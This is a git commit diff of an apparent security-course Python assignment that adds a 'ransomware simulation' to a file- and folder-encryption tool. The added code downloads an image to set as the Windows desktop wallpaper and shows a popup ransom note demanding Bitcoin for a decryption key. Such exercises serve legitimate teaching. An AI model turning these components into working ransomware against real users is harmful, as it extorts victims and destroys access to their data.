2700dc4c895dad4585a5a2a00309d720de026131
DJ Choi <djchoi82@gmail.com>
2022-04-13 21:39:27 -0700

    push

--- ops-401d4:_Challenge_08.py
+++ ops-401d4:_Challenge_08.py
@@ -9,9 +9,10 @@ from cryptography.fernet import Fernet
 import os
 import os.path
 import ctypes
+import urllib.request
+
 
 #declare functions
-
 #generates key and save it to a file
 def write_key():
     key = Fernet.generate_key()
@@ -24,7 +25,7 @@ def load_key():
 
 #menu
 def menu():
-    choice = input("Options:\n[1] Encrypt a file\n[2] Decrypt a file\n[3] Encrypt a message\n[4] Decrypt a message\n[5] Encrypt a folder and all its contents\n[6] Decrypt a folder and all its contents\n[7] Ransomware simulation\n[8] Reverse ransomware simulation\nEnter a number: ")
+    choice = input("Options:\n[1] Encrypt a file\n[2] Decrypt a file\n[3] Encrypt a message\n[4] Decrypt a message\n[5] Encrypt a folder and all its contents\n[6] Decrypt a folder and all its contents\n[7] Ransomware simulation\nEnter a number: ")
 
     if choice == '1':  
         filename = input("Enter filepath: ")
@@ -51,13 +52,9 @@ def menu():
         decrypt_dir(folder)
 
     elif choice == '7':
-        MessageBox = ctypes.windll.user32.MessageBoxW  # MessageBoxA in Python2
-        MessageBox(None, 'Message\nfor\nthe\nuser', 'Window title', 0)
-
-    elif choice == '8':
-        folder = input("Enter folder path: ")
+        change_desktop_background()
+        popup()
         
-
     else:
         print("Invalid choice. Please try again.")
 
@@ -71,6 +68,11 @@ def key_check():
     global f
     f = Fernet(key)
 
+#messagebox popup
+def popup():
+    MessageBox = ctypes.windll.user32.MessageBoxW  
+    MessageBox(None, 'Your files have been encrypted and are no longer accessible. There is no way to restore your data without a special key. Send BTC to Key@RW.com for special key', 'Ransomeware', 0)
+
 #encrypt a message
 def encrypt_message(message):
     key_check()
@@ -82,6 +84,17 @@ def decrypt_message(message):
     key_check()
     decrypted = f.decrypt(message)
     print("Plaintext is "+str(decrypted.decode('utf-8')))
+
+#change desktop background
+def change_desktop_background():
+    user = os.path.expanduser('~')
+    imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
+    # Go to specif url and download+save image using absolute path
+    path = f'{user}/Desktop/pic.jpg'
+    urllib.request.urlretrieve(imageUrl, path)
+    SPI_SETDESKWALLPAPER = 20
+    # Access windows dlls for funcionality eg, changing dekstop wallpaper
+    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)
 
 #encrypt file
 def encrypt_file(filename):
@@ -132,5 +145,3 @@ def decrypt_dir(folder):
 menu()
 
 #end
-
-
